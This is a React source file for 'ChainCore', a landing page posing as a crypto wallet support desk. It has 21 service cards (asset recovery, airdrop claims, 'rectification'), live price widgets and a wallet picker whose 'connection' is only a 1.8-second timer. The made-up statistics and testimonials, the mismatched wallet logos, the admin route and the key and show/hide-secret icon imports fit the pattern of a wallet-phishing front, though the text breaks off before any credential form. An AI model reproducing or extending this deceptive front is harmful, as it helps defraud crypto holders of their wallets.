import { useEffect, useState, type CSSProperties, type FormEvent, type ReactNode } from 'react';
import deviceShowcaseImage from '../../../attached_assets/image_1789531287342.png';
import metamaskLogo from '../../../attached_assets/image_1789553730706.png';
import phantomLogo from '../../../attached_assets/image_1789554000103.png';
import trustWalletLogo from '../../../attached_assets/image_1789553873825.png';
import walletConnectLogo from '../../../attached_assets/image_1789554040017.png';
import coinbaseWalletLogo from '../../../attached_assets/image_1789554110443.png';
import qrWalletLogo from '../../../attached_assets/image_1789554239054.png';
import suiWalletLogo from '../../../attached_assets/image_1789532220311.png';
import safeWalletLogo from '../../../attached_assets/image_1789532240386.png';
import okxWalletLogo from '../../../attached_assets/image_1789554378966.png';
import rabbyWalletLogo from '../../../attached_assets/image_1789532291549.png';
import subwalletLogo from '../../../attached_assets/image_1789548145798.png';
import taostatsWalletLogo from '../../../attached_assets/image_1789548209334.png';
import robinhoodWalletLogo from '../../../attached_assets/image_1789548443023.png';
import rabbyUpdatedLogo from '../../../attached_assets/image_1789554281485.png';
import {
  ArrowDownRight,
  ArrowRightLeft,
  ArrowRight,
  ArrowUpDown,
  Check,
  ChevronDown,
  CircleHelp,
  Clock3,
  Coins,
  Fingerprint,
  Gift,
  Gem,
  Globe2,
  KeyRound,
  Layers3,
  Link2,
  LockKeyhole,
  Menu,
  Network,
  RefreshCw,
  Route,
  RotateCcw,
  Search,
  ScanLine,
  Server,
  ShieldCheck,
  SlidersHorizontal,
  Sparkles,
  SquareArrowOutUpRight,
  TriangleAlert,
  Trophy,
  TrendingUp,
  Wifi,
  WifiOff,
  X,
  Zap,
  DollarSign,
  Eye,
  EyeOff,
  type LucideIcon,
} from 'lucide-react';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import { ErrorBoundary } from '@/components/error-boundary';
import { Toaster } from '@/components/ui/toaster';
import { TooltipProvider } from '@/components/ui/tooltip';
import NotFound from '@/pages/not-found';
import AdminPage from '@/pages/admin';
import { Route as WouterRoute, Switch, useLocation, Router as WouterRouter } from 'wouter';

const queryClient = new QueryClient();

type Service = {
  title: string;
  slug: string;
  description: string;
  color: string;
  icon: LucideIcon;
};

const services: Service[] = [
  { title: 'Migration', slug: 'migration', description: 'Move assets between networks with a clear recovery path.', color: '#36d8e7', icon: ArrowRightLeft },
  { title: 'Rectification', slug: 'rectification', description: 'Diagnose unexpected wallet behavior and failed actions.', color: '#c07cff', icon: SlidersHorizontal },
  { title: 'Claim', slug: 'claim', description: 'Resolve token claims and confirm the right contract flow.', color: '#3ee884', icon: Gift },
  { title: 'Swap', slug: 'swap', description: 'Review a swap that stalled, reverted, or settled incorrectly.', color: '#5aa7ff', icon: RefreshCw },
  { title: 'Slippage', slug: 'slippage', description: 'Untangle fee settings, price impact, and execution limits.', color: '#ed68b7', icon: TrendingUp },
  { title: 'Claim Airdrop', slug: 'claim-airdrop', description: 'Check an airdrop flow and identify where it stopped.', color: '#f5cc27', icon: Zap },
  { title: 'Staking', slug: 'staking', description: 'Get unstuck on staking, unstaking, or reward timing.', color: '#8b83ff', icon: Layers3 },
  { title: 'Whitelist', slug: 'whitelist', description: 'Resolve address approval and allowlist requirements.', color: '#3ee3a2', icon: ShieldCheck },
  { title: 'Cross Transfer', slug: 'cross-transfer', description: 'Trace a cross-network transfer from source to destination.', color: '#92e83a', icon: ArrowUpDown },
  { title: 'NFTs', slug: 'nfts', description: 'Investigate NFT visibility, transfer, and metadata issues.', color: '#f27491', icon: Gem },
  { title: 'Locked Account', slug: 'locked-account', description: 'Find the next step when account access is blocked.', color: '#ffc42e', icon: LockKeyhole },
  { title: 'Login Error', slug: 'login-error', description: 'Diagnose sign-in failures across supported wallet apps.', color: '#f2c31c', icon: TriangleAlert },
  { title: 'Transaction Delay', slug: 'transaction-delay', description: 'Check pending transactions and confirmation timing.', color: '#a8b4d1', icon: Clock3 },
  { title: 'Missing / Irregular Balance', slug: 'missing-balance', description: 'Compare wallet display, balances, and on-chain records.', color: '#3bd995', icon: DollarSign },
  { title: 'RPC / Chainlink', slug: 'rpc-chainlink', description: 'Resolve RPC, oracle, and network connection issues.', color: '#4be7a6', icon: Network },
  { title: 'Asset Recovery', slug: 'asset-recovery', description: 'Start a structured review for an asset you cannot locate.', color: '#26c8df', icon: RotateCcw },
  { title: 'Buy Token / Coin', slug: 'buy-token-coin', description: 'Get help with a token purchase or payment source check.', color: '#f39b4a', icon: Coins },
  { title: 'Bridging', slug: 'bridging', description: 'Trace a bridge transfer and surface the next action.', color: '#dc72ef', icon: Link2 },
  { title: 'Claim Reward', slug: 'claim-reward', description: 'Resolve reward eligibility and payout questions.', color: '#d4f23f', icon: Trophy },
  { title: 'Node Validation', slug: 'node-validation', description: 'Inspect validator, node, and RPC response issues.', color: '#347cff', icon: Server },
  { title: 'Other Issues', slug: 'other-issues', description: 'Start a general review when no category fits.', color: '#aab4c6', icon: CircleHelp },
];

const faqs = [
  ['What should I include in a request?', 'Share the public address or transaction hash, the network you used, and a short description of where the flow stopped.'],
  ['How does the support intake work?', 'Choose the closest issue category, share a public address or transaction hash, and tell us where the flow stopped. A specialist can then give you a clear next step.'],
  ['Can you help across different networks?', 'Yes. Our intake supports the common EVM networks and can route network-specific RPC, bridge, and transaction questions to the right specialist.'],
  ['How quickly will I hear back?', 'Most requests receive an initial review during the current support window. The intake screen confirms the request reference so you know it was received.'],
];

function scrollToSection(id: string) {
  document.getElementById(id)?.scrollIntoView({ behavior: 'smooth', block: 'start' });
}

function ChainCoreLogo() {
  return (
    <span className="chaincore-logo" aria-label="ChainCore">
      <svg className="chaincore-logo-mark" viewBox="0 0 32 32" aria-hidden="true">
        <path d="M16 2.8 28.3 9.9v12.2L16 29.2 3.7 22.1V9.9L16 2.8Z" fill="none" stroke="currentColor" strokeWidth="1.5" />
        <path d="m11.3 13.2 4.7-2.7 4.7 2.7v5.6L16 21.5l-4.7-2.7v-5.6Z" fill="currentColor" opacity=".16" />
        <path d="m11.3 13.2 4.7 2.7 4.7-2.7M16 15.9v5.6" fill="none" stroke="currentColor" strokeWidth="1.2" />
      </svg>
      <span className="brand-type">Chain<i>Core</i></span>
    </span>
  );
}

type Market = {
  symbol: string;
  price: string;
  change: string;
  direction: 'up' | 'down';
  slug: string;
  logoUrl?: string;
};

type CoinGeckoMarket = {
  id: string;
  current_price: number | null;
  price_change_percentage_24h: number | null;
  image: string;
};

const marketConfig = [
  { id: 'cardano', symbol: 'ADA', slug: 'ada' },
  { id: 'avalanche-2', symbol: 'AVAX', slug: 'avax' },
  { id: 'bitcoin', symbol: 'BTC', slug: 'btc' },
  { id: 'ethereum', symbol: 'ETH', slug: 'eth' },
  { id: 'binancecoin', symbol: 'BNB', slug: 'bnb' },
  { id: 'ripple', symbol: 'XRP', slug: 'xrp' },
] as const;

const fallbackMarkets: Market[] = [
  { symbol: 'ADA', price: '$0.281506', change: '-3.19%', direction: 'down', slug: 'ada', logoUrl: 'https://assets.coingecko.com/coins/images/975/large/cardano.png' },
  { symbol: 'AVAX', price: '$7.43', change: '-0.44%', direction: 'down', slug: 'avax', logoUrl: 'https://assets.coingecko.com/coins/images/12559/large/Avalanche_Circle_RedWhite_Transparent.png' },
  { symbol: 'BTC', price: '$75,962', change: '-3.23%', direction: 'down', slug: 'btc', logoUrl: 'https://assets.coingecko.com/coins/images/1/large/bitcoin.png' },
  { symbol: 'ETH', price: '$2,412', change: '-3.69%', direction: 'down', slug: 'eth', logoUrl: 'https://assets.coingecko.com/coins/images/279/large/ethereum.png' },
  { symbol: 'BNB', price: '$717.08', change: '-0.65%', direction: 'down', slug: 'bnb', logoUrl: 'https://assets.coingecko.com/coins/images/825/large/bnb-icon2_2x.png' },
  { symbol: 'XRP', price: '$1.39', change: '-0.90%', direction: 'down', slug: 'xrp', logoUrl: 'https://assets.coingecko.com/coins/images/44/large/xrp-symbol-white-128.png' },
];

const fallingCoinConfig = [
  { id: 'bitcoin', fallbackLogo: 'https://assets.coingecko.com/coins/images/1/large/bitcoin.png' },
  { id: 'ethereum', fallbackLogo: 'https://assets.coingecko.com/coins/images/279/large/ethereum.png' },
  { id: 'solana', fallbackLogo: 'https://assets.coingecko.com/coins/images/4128/large/solana.png' },
  { id: 'cardano', fallbackLogo: 'https://assets.coingecko.com/coins/images/975/large/cardano.png' },
  { id: 'avalanche-2', fallbackLogo: 'https://assets.coingecko.com/coins/images/12559/large/Avalanche_Circle_RedWhite_Transparent.png' },
  { id: 'binancecoin', fallbackLogo: 'https://assets.coingecko.com/coins/images/825/large/bnb-icon2_2x.png' },
  { id: 'ripple', fallbackLogo: 'https://assets.coingecko.com/coins/images/44/large/xrp-symbol-white-128.png' },
  { id: 'dogecoin', fallbackLogo: 'https://assets.coingecko.com/coins/images/5/large/dogecoin.png' },
  { id: 'chainlink', fallbackLogo: 'https://assets.coingecko.com/coins/images/877/large/chainlink-new-logo.png' },
  { id: 'polkadot', fallbackLogo: 'https://assets.coingecko.com/coins/images/12171/large/polkadot.png' },
] as const;

const fallingLogoPositions = [
  { left: 5, delay: -1, duration: 15, size: 34 },
  { left: 14, delay: -8, duration: 22, size: 52 },
  { left: 24, delay: -14, duration: 18, size: 27 },
  { left: 34, delay: -4, duration: 25, size: 42 },
  { left: 45, delay: -18, duration: 19, size: 30 },
  { left: 57, delay: -11, duration: 24, size: 48 },
  { left: 67, delay: -2, duration: 17, size: 29 },
  { left: 76, delay: -16, duration: 23, size: 39 },
  { left: 86, delay: -7, duration: 20, size: 31 },
  { left: 94, delay: -20, duration: 26, size: 46 },
] as const;

function formatMarketPrice(price: number) {
  return new Intl.NumberFormat('en-US', {
    style: 'currency',
    currency: 'USD',
    minimumFractionDigits: price < 1 ? 2 : 0,
    maximumFractionDigits: price < 1 ? 6 : 2,
  }).format(price);
}

function formatMarketChange(change: number) {
  return `${change >= 0 ? '+' : ''}${change.toFixed(2)}%`;
}

function MarketTicker() {
  const [markets, setMarkets] = useState<Market[]>(fallbackMarkets);

  useEffect(() => {
    const controller = new AbortController();
    const ids = marketConfig.map(({ id }) => id).join(',');
    const endpoint = `https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&ids=${ids}&price_change_percentage=24h`;

    fetch(endpoint, { signal: controller.signal })
      .then((response) => {
        if (!response.ok) throw new Error(`CoinGecko request failed: ${response.status}`);
        return response.json() as Promise<CoinGeckoMarket[]>;
      })
      .then((data) => {
        const byId = new Map(data.map((market) => [market.id, market]));
        const liveMarkets = marketConfig.map(({ id, symbol, slug }, index) => {
          const market = byId.get(id);
          const fallback = fallbackMarkets[index];
          const change = market?.price_change_percentage_24h;

          return market?.current_price != null && change != null
            ? {
                symbol,
                price: formatMarketPrice(market.current_price),
                change: formatMarketChange(change),
                direction: change >= 0 ? 'up' as const : 'down' as const,
                slug,
                logoUrl: market.image,
              }
            : fallback;
        });
        setMarkets(liveMarkets);
      })
      .catch((error: unknown) => {
        if ((error as Error).name !== 'AbortError') {
          console.warn('Using fallback market data because CoinGecko is unavailable.', error);
        }
      });

    return () => controller.abort();
  }, []);

  return (
    <div className="ticker" data-testid="market-ticker" aria-label="Live cryptocurrency prices">
      <div className="ticker-track">
        {[...markets, ...markets].map(({ symbol, price, change, direction, slug, logoUrl }, index) => (
          <span className="ticker-item" key={`${symbol}-${index}`}>
            <span className={`ticker-token-logo ticker-token-${slug}`}>
              {logoUrl ? <img src={logoUrl} alt="" loading="lazy" /> : symbol.slice(0, 2)}
            </span>
            <b>{symbol}</b>&nbsp; {price} &nbsp;<span className={direction}>{change}</span>
          </span>
        ))}
      </div>
    </div>
  );
}

function FallingCryptoLogos() {
  const [logos, setLogos] = useState<Array<{ id: string; logo: string }>>(
    fallingCoinConfig.map(({ id, fallbackLogo }) => ({ id, logo: fallbackLogo })),
  );

  useEffect(() => {
    const controller = new AbortController();
    const ids = fallingCoinConfig.map(({ id }) => id).join(',');
    const endpoint = `https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&ids=${ids}&per_page=${fallingCoinConfig.length}`;

    fetch(endpoint, { signal: controller.signal })
      .then((response) => {
        if (!response.ok) throw new Error(`CoinGecko logo request failed: ${response.status}`);
        return response.json() as Promise<CoinGeckoMarket[]>;
      })
      .then((data) => {
        const liveLogos = new Map(data.map((coin) => [coin.id, coin.image]));
        setLogos(fallingCoinConfig.map(({ id, fallbackLogo }) => ({ id, logo: liveLogos.get(id) ?? fallbackLogo })));
      })
      .catch((error: unknown) => {
        if ((error as Error).name !== 'AbortError') {
          console.warn('Using CoinGecko logo fallbacks.', error);
        }
      });

    return () => controller.abort();
  }, []);

  return (
    <div className="falling-crypto-field" aria-hidden="true" data-testid="falling-crypto-logos">
      {logos.map(({ id, logo }, index) => {
        const position = fallingLogoPositions[index];
        return (
          <img
            className="falling-crypto-logo"
            key={id}
            src={logo}
            alt=""
            style={{
              '--fall-left': `${position.left}%`,
              '--fall-delay': `${position.delay}s`,
              '--fall-duration': `${position.duration}s`,
              '--fall-size': `${position.size}px`,
            } as CSSProperties}
          />
        );
      })}
    </div>
  );
}

type CoinGeckoChartResponse = {
  prices: [number, number][];
  total_volumes: [number, number][];
};

const fallbackChartPoints = [
  64200, 66100, 64800, 68200, 67100, 69900, 68100, 71200, 69500, 72800,
  71300, 74600, 73100, 76900, 75200, 77900, 76400, 79200, 78100, 80600,
  78800, 82300, 80500, 84100, 82600, 85200, 83300, 86700, 84900, 88100,
  86500, 89900, 88200, 91300, 89400, 92600, 90800, 94100, 92300, 95100,
];

function MarketSizeChart() {
  const [prices, setPrices] = useState<number[]>(fallbackChartPoints);
  const [volumes, setVolumes] = useState<number[]>(fallbackChartPoints.map((_, index) => 20 + ((index * 17) % 43)));

  useEffect(() => {
    const controller = new AbortController();
    fetch('https://api.coingecko.com/api/v3/coins/bitcoin/market_chart?vs_currency=usd&days=365&interval=daily', { signal: controller.signal })
      .then((response) => {
        if (!response.ok) throw new Error(`CoinGecko chart request failed: ${response.status}`);
        return response.json() as Promise<CoinGeckoChartResponse>;
      })
      .then((data) => {
        const step = Math.max(1, Math.floor(data.prices.length / 48));
        const sampledPrices = data.prices.filter((_, index) => index % step === 0).map(([, value]) => value);
        const sampledVolumes = data.total_volumes.filter((_, index) => index % step === 0).map(([, value]) => value);
        if (sampledPrices.length > 1) {
          setPrices(sampledPrices);
          setVolumes(sampledVolumes.length > 1 ? sampledVolumes : sampledPrices.map(() => 1));
        }
      })
      .catch((error: unknown) => {
        if ((error as Error).name !== 'AbortError') {
          console.warn('Using fallback market chart because CoinGecko is unavailable.', error);
        }
      });

    return () => controller.abort();
  }, []);

  const min = Math.min(...prices);
  const max = Math.max(...prices);
  const range = max - min || 1;
  const maxVolume = Math.max(...volumes, 1);
  const linePath = prices.map((price, index) => {
    const x = (index / Math.max(prices.length - 1, 1)) * 700;
    const y = 18 + (1 - (price - min) / range) * 92;
    return `${index === 0 ? 'M' : 'L'} ${x.toFixed(1)} ${y.toFixed(1)}`;
  }).join(' ');
  const areaPath = `${linePath} L 700 132 L 0 132 Z`;
  const change = ((prices[prices.length - 1] - prices[0]) / prices[0]) * 100;

  return (
    <div className="market-size-chart" data-testid="market-size-chart">
      <div className="market-chart-head">
        <span><b>BTC / USD</b> · 1 YEAR</span>
        <strong className={change >= 0 ? 'up' : 'down'}>{change >= 0 ? 'UP' : 'DOWN'} {change >= 0 ? '+' : ''}{change.toFixed(2)}%</strong>
      </div>
      <svg className="market-chart-svg" viewBox="0 0 700 145" preserveAspectRatio="none" role="img" aria-label="Bitcoin one year price chart">
        <defs>
          <linearGradient id="market-chart-fill" x1="0" x2="0" y1="0" y2="1">
            <stop offset="0" stopColor="#a9ed63" stopOpacity=".24" />
            <stop offset="1" stopColor="#a9ed63" stopOpacity="0" />
          </linearGradient>
        </defs>
        {[25, 60, 95, 130].map((y) => <line key={y} x1="0" x2="700" y1={y} y2={y} className="market-chart-grid-line" />)}
        {volumes.map((volume, index) => {
          const barWidth = 700 / Math.max(volumes.length, 1);
          const height = 18 + (volume / maxVolume) * 28;
          return <rect key={index} x={index * barWidth + .8} y={132 - height} width={Math.max(barWidth - 2, 2)} height={height} rx="1" className="market-chart-volume" />;
        })}
        <path d={areaPath} className="market-chart-area" />
        <path d={linePath} className="market-chart-line" />
      </svg>
      <div className="market-chart-axis"><span>SEP 24</span><span>MAR 25</span><span>SEP 25</span><span>DEC 25</span></div>
    </div>
  );
}

function SiteNav({ onSupport }: { onSupport: () => void }) {
  return (
    <nav className="nav" data-testid="site-navigation">
      <div className="wrap nav-inner">
        <div className="brand-wrap">
        <button className="brand" onClick={() => scrollToSection('top')} data-testid="button-brand-home">
          <ChainCoreLogo />
        </button>
        <div className="brand-socials" aria-label="Social channels">
              <span className="brand-social-mark" aria-label="X">
              <span className="brand-social-fallback" aria-hidden="true">𝕏</span>
                <svg viewBox="0 0 24 24" aria-hidden="true">
                  <path d="M5 4 19 20M19 4 5 20" />
                </svg>
              </span>
              <span className="brand-social-mark brand-discord-mark" aria-label="Discord">
              <span className="brand-social-fallback" aria-hidden="true">◉</span>
                <svg viewBox="0 0 24 24" aria-hidden="true">
                  <path d="M6.3 6.4a13.6 13.6 0 0 1 11.4 0c1.6 2.3 2.3 5.1 2 8.2-1.3 1-2.8 1.7-4.4 2.1l-1.1-1.5a7.2 7.2 0 0 0 3-1.4c-.3.2-.7.4-1.1.6a8.2 8.2 0 0 1-7.1 0c-.4-.2-.8-.4-1.1-.6a7.2 7.2 0 0 0 3 1.4l-1.1 1.5c-1.6-.4-3.1-1.1-4.4-2.1-.3-3.1.4-5.9 2-8.2Z" />
                  <circle cx="9.5" cy="11.5" r="1.25" />
                  <circle cx="14.5" cy="11.5" r="1.25" />
                </svg>
              </span>
        </div>
        </div>
        <div className="nav-links">
          <button className="nav-link" onClick={() => scrollToSection('services')} data-testid="link-nav-services">Services</button>
          <button className="nav-link" onClick={() => scrollToSection('approach')} data-testid="link-nav-approach">How it works</button>
          <button className="nav-link" onClick={() => scrollToSection('security')} data-testid="link-nav-security">Security</button>
          <button className="nav-link" onClick={() => scrollToSection('faq')} data-testid="link-nav-faq">FAQ</button>
        </div>
        <div className="nav-actions">
          <button className="nav-ghost" onClick={() => scrollToSection('security')} data-testid="button-nav-docs">Safety notes</button>
          <button className="nav-cta" onClick={onSupport} data-testid="button-nav-support">Get support <ArrowRight size={13} /></button>
          <button className="nav-ghost" onClick={() => scrollToSection('services')} aria-label="Jump to services" data-testid="button-mobile-menu"><Menu size={16} /></button>
        </div>
      </div>
    </nav>
  );
}

function Hero({ onSupport }: { onSupport: () => void }) {
  return (
    <section className="hero" id="top">
      <div className="ambient-lines" />
      <div className="wrap hero-layout">
        <div className="hero-copy">
          <div className="hero-kicker reveal" data-testid="status-availability"><span className="kicker-dot" /> Support desk online · choose an issue below</div>
           <h1 className="reveal reveal-1">The shortest path <em>back on-chain.</em></h1>
           <p className="reveal reveal-2">A focused support desk for wallet, transaction, bridge, token, and network problems.</p>
          <div className="hero-actions reveal reveal-3">
            <button className="primary-btn" onClick={onSupport} data-testid="button-hero-start">Start here <ArrowRight size={15} /></button>
            <button className="outline-btn" onClick={() => scrollToSection('services')} data-testid="button-hero-services">See all services</button>
          </div>
          <div className="hero-proof reveal reveal-4">
            <div className="proof-lines" aria-hidden="true"><span className="proof-dot" /><span className="proof-dot" /><span className="proof-dot" /></div>
             <span>24 / 7 support access<br />Clear steps for every issue.</span>
          </div>
        </div>
        <div className="device-showcase reveal reveal-3" data-testid="card-live-operations">
          <img src={deviceShowcaseImage} alt="ChainCore wallet support available on a phone and laptop" />
          <div className="device-showcase-caption"><ActivityIcon /><span>ChainCore support · desktop + mobile</span></div>
        </div>
      </div>
    </section>
  );
}

function ActivityIcon() {
  return <span style={{ display: 'inline-flex', color: 'hsl(var(--primary))' }}><Zap size={15} /></span>;
}

function SignalBand() {
  const stats = [['$371.65M', 'market size'], ['$128.37M', 'total borrowed'], ['21', 'support services'], ['24 / 7', 'support access']];
  return <div className="signal-band" data-testid="section-network-signals"><div className="wrap signal-grid"><div className="signal-item signal-market-item"><MarketSizeChart /><span className="signal-market-label">market size</span></div>{stats.slice(1).map(([value, label]) => <div className="signal-item" key={label}><div className="signal-value">{value}</div><div className="signal-label">{label}</div></div>)}</div></div>;
}

function TrustSection() {
  const quotes = [
    ['“', 'The instructions were clear. We knew what to check and what not to touch.', 'Maya Laurent', 'Atlas Treasury'],
    ['“', 'I had a wallet problem and got a direct answer without being asked for my private information.', 'Jon Bell', 'Northstar Labs'],
    ['“', 'A useful first stop when a transaction or wallet connection does not work.', 'Elena Reyes', 'Vertex Guild'],
  ];
  return <section className="section section-rule" id="credibility"><div className="wrap"><div className="credibility"><div className="credibility-aside"><span className="eyebrow">What users say</span><p>People come here when a wallet, transaction, or token does not work as expected.</p></div><div className="section-heading"><h2>Real help for wallet problems.</h2><p>Pick the issue that matches your problem. We keep the instructions short and easy to follow.</p></div></div><div className="trust-grid">{quotes.map(([mark, quote, name, role], index) => <article className="trust-card" key={name} data-testid={`card-testimonial-${index}`}><div className="quote-mark">{mark}</div><blockquote>{quote}</blockquote><div className="trust-author"><div className="author-orb">{name.split(' ').map((part) => part[0]).join('')}</div><div><div className="author-name">{name}</div><div className="author-role">{role}</div></div></div></article>)}</div></div></section>;
}

function ServicesSection({ onSelect }: { onSelect: (service: Service) => void }) {
  return <section className="section services-section section-grid" id="services"><div className="wrap"><div className="services-head"><div className="section-heading"><span className="eyebrow">Choose a service</span><h2>What do you need help with?</h2><p>Pick the closest match. You can share more context in the next step.</p></div><div className="services-note"><b>21 services</b><br />One clear path to start.</div></div><div className="service-grid">{services.map((service) => { const Icon = service.icon; const isFeaturedIcon = service.slug === 'swap' || service.slug === 'migration' || service.slug === 'rectification' || service.slug === 'claim' || service.slug === 'slippage' || service.slug === 'claim-airdrop' || service.slug === 'staking' || service.slug === 'whitelist' || service.slug === 'login-error' || service.slug === 'transaction-delay' || service.slug === 'asset-recovery' || service.slug === 'bridging' || service.slug === 'cross-transfer' || service.slug === 'node-validation' || service.slug === 'missing-balance'; return <button className={`service-card service-card-${service.slug}`} style={{ '--service-color': service.color } as CSSProperties} key={service.slug} onClick={() => onSelect(service)} data-testid={`service-card-${service.slug}`}><span className="service-icon"><Icon size={isFeaturedIcon ? 32 : 30} strokeWidth={isFeaturedIcon ? 2.5 : 2.25} /></span><ArrowUpRightIcon /><h3>{service.title}</h3><p>{service.description}</p></button>; })}</div></div></section>;
}

function ArrowUpRightIcon() {
  return <span className="service-arrow"><SquareArrowOutUpRight size={14} /></span>;
}

function ApproachSection() {
   const steps = [
    ['01', 'Name the problem', 'Choose the closest issue. You do not need to know the protocol terminology.'],
    ['02', 'Share the trace', 'Add a public address, transaction hash, network, and the moment the flow stopped.'],
    ['03', 'Take the next step', 'Receive a concise review with the next action and the checks behind it.'],
  ];
  return <section className="section flow-section" id="approach"><div className="wrap flow-layout"><div className="flow-copy"><span className="eyebrow">How it works</span><h2>Three steps to get unstuck.</h2><p>You do not need to know the technical name for the problem. Start with the closest match.</p></div><div className="flow-list">{steps.map(([number, title, copy]) => <div className="flow-step" key={number}><div className="flow-index">{number}</div><div className="flow-content"><h3>{title}</h3><p>{copy}</p></div></div>)}</div></div></section>;
}

function SecuritySection() {
  return <section className="section section-rule" id="security"><div className="wrap"><div className="section-heading"><span className="eyebrow">Request details</span><h2>Give us a useful starting point.</h2><p>The fastest reviews include details that can be checked on-chain.</p></div><div className="security-panel"><div className="security-cell"><ShieldCheck className="security-icon" size={24} strokeWidth={1.5} /><h3>Keep it public</h3><p>Use information visible in your wallet app or on a block explorer so the issue can be traced quickly.</p><div className="security-list"><div><span className="check"><Check size={9} /></span>Transaction hash</div><div><span className="check"><Check size={9} /></span>Wallet address</div><div><span className="check"><Check size={9} /></span>Network name</div></div></div><div className="security-cell"><Fingerprint className="security-icon" size={24} strokeWidth={1.5} /><h3>Describe the stop</h3><p>Tell us what you expected, what happened, and which step did not complete.</p><div className="security-list"><div><span className="check"><Check size={9} /></span>What you tried</div><div><span className="check"><Check size={9} /></span>What you saw</div><div><span className="check"><Check size={9} /></span>Where it happened</div></div></div></div></div></section>;
}

function FAQSection() {
  const [open, setOpen] = useState(0);
  return <section className="section section-rule" id="faq"><div className="wrap faq-layout"><div className="section-heading"><span className="eyebrow">FAQ</span><h2>Before you start.</h2><p>Here are the questions people ask most. If you still need help, choose a service above.</p></div><div className="faq-list">{faqs.map(([question, answer], index) => <div className="faq-item" key={question}><button className="faq-trigger" onClick={() => setOpen(open === index ? -1 : index)} aria-expanded={open === index} data-testid={`button-faq-${index}`}><span>{question}</span>{open === index ? <ChevronDown size={16} /> : <ArrowRight size={16} />}</button>{open === index && <div className="faq-answer" data-testid={`text-faq-answer-${index}`}>{answer}</div>}</div>)}</div></div></section>;
}

type WalletOption = {
  name: string;
  mark: string;
  className: string;
  logo: string;
  accent: string;
  surface: string;
  text: string;
};

const otherWalletLogo = 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64"%3E%3Ccircle cx="32" cy="32" r="30" fill="%23131716"/%3E%3Cpath d="M32 18v28M18 32h28" stroke="%23A8DB45" stroke-width="6" stroke-linecap="round"/%3E%3C/svg%3E';

const walletOptions: WalletOption[] = [
  { name: 'MetaMask', mark: 'M', className: 'metamask', logo: metamaskLogo, accent: '#f6851b', surface: '#18110b', text: '#f7f1e9' },
  { name: 'Phantom', mark: 'P', className: 'phantom', logo: phantomLogo, accent: '#a78bfa', surface: '#171126', text: '#f5f2ff' },
  { name: 'Trust Wallet', mark: 'T', className: 'trust-wallet', logo: trustWalletLogo, accent: '#3375f6', surface: '#0e172d', text: '#edf3ff' },
  { name: 'WalletConnect', mark: 'W', className: 'wallet-connect', logo: walletConnectLogo, accent: '#3b99fc', surface: '#0b1728', text: '#edf7ff' },
  { name: 'Coinbase Wallet', mark: 'C', className: 'coinbase-wallet', logo: coinbaseWalletLogo, accent: '#2f80ed', surface: '#0d1729', text: '#edf4ff' },
  { name: 'Ledger Wallet', mark: 'L', className: 'ledger-wallet', logo: qrWalletLogo, accent: '#ffffff', surface: '#000000', text: '#f5f5f5' },
  { name: 'Rabby Wallet', mark: 'R', className: 'rabby-wallet', logo: rabbyUpdatedLogo, accent: '#9c8cff', surface: '#141414', text: '#f5f3ff' },
  { name: 'Backpack Wallet', mark: 'B', className: 'backpack-wallet', logo: safeWalletLogo, accent: '#ef6256', surface: '#241313', text: '#fff3f0' },
  { name: 'OKX Wallet', mark: 'O', className: 'okx-wallet', logo: okxWalletLogo, accent: '#b7ef9f', surface: '#f8faf7', text: '#131313' },
  { name: 'Exodus Wallet', mark: 'E', className: 'exodus-wallet', logo: rabbyWalletLogo, accent: '#8d7cff', surface: '#17142b', text: '#f7f5ff' },
  { name: 'SubWallet', mark: 'S', className: 'subwallet', logo: subwalletLogo, accent: '#6174ff', surface: '#101a25', text: '#f4f6ff' },
  { name: 'TaoStats Wallet', mark: 'T', className: 'taostats-wallet', logo: taostatsWalletLogo, accent: '#53d9ad', surface: '#101b17', text: '#f1fff9' },
  { name: 'Robinhood Wallet', mark: 'R', className: 'robinhood-wallet', logo: robinhoodWalletLogo, accent: '#d657ff', surface: '#100b2c', text: '#fbf2ff' },
  { name: 'Other Wallet', mark: '+', className: 'other-wallet', logo: otherWalletLogo, accent: '#a8db45', surface: '#11170d', text: '#f1f7ea' },
];

function WalletPicker({
  selectedWallet,
  onSelect,
  onContinue,
  onClose,
}: {
  selectedWallet: string | null;
  onSelect: (wallet: WalletOption) => void;
  onContinue: () => void;
  onClose: () => void;
}) {
  const [tab, setTab] = useState<'recent' | 'manual'>('recent');
  const [search, setSearch] = useState('');
  const [connectionReady, setConnectionReady] = useState(false);
  const visibleWallets = walletOptions.filter((wallet) => wallet.name.toLowerCase().includes(search.toLowerCase()));
  const activeWallet = walletOptions.find((wallet) => wallet.name === selectedWallet);

  useEffect(() => {
    if (!selectedWallet) {
      setConnectionReady(false);
      return;
    }
    setConnectionReady(false);
    const timer = window.setTimeout(() => setConnectionReady(true), 1800);
    return () => window.clearTimeout(timer);
  }, [selectedWallet]);

  return (
    <div className="wallet-picker" data-testid="wallet-picker">
      <aside className="wallet-picker-sidebar">
        <div className="wallet-picker-tabs" role="tablist" aria-label="Wallet categories">
          <button className={tab === 'recent' ? 'active' : ''} onClick={() => setTab('recent')} role="tab" aria-selected={tab === 'recent'}>Recent</button>
          <button className={tab === 'manual' ? 'active' : ''} onClick={() => setTab('manual')} role="tab" aria-selected={tab === 'manual'}>Manual Kit</button>
        </div>
        <p className="wallet-picker-label">Popular:</p>
        <label className="wallet-search">
          <Search size={16} />
          <input value={search} onChange={(event) => setSearch(event.target.value)} placeholder="Search wallets..." aria-label="Search wallets" />
        </label>
        <div className="wallet-list">
          {visibleWallets.map((wallet) => (
            <button className={`wallet-option ${selectedWallet === wallet.name ? 'selected' : ''}`} key={wallet.name} onClick={() => onSelect(wallet)} data-testid={`wallet-option-${wallet.className}`}>
              <span className={`wallet-mark wallet-mark-${wallet.className}`}><img className="wallet-mark-image" src={wallet.logo} alt="" />{!wallet.logo && wallet.mark}</span>
              <strong>{wallet.name}</strong>
              {wallet.name === 'MetaMask' && <span className="wallet-recommended">RECOMMENDED</span>}
            </button>
          ))}
          {visibleWallets.length === 0 && <p className="wallet-empty">No matching wallets.</p>}
        </div>
      </aside>
      <section className="wallet-picker-preview">
        <button className="wallet-picker-close" onClick={onClose} aria-label="Close wallet picker"><X size={19} /></button>
        {selectedWallet && activeWallet ? (
          <div
            className={`wallet-connection-card wallet-connection-${activeWallet.className} ${connectionReady ? 'ready' : ''}`}
            style={{
              '--wallet-accent': activeWallet.accent,
              '--wallet-surface': activeWallet.surface,
              '--wallet-text': activeWallet.text,
